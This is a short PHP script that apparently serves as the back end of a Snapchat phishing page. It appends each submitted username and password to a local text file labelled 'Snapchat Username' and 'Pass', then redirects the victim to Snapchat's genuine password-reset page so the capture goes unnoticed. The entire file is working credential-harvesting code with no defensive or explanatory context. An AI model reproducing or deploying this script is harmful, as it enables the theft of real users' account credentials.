<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['dylan_molly21'] . " Pass: " . $_POST['testest'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
exit();
?>
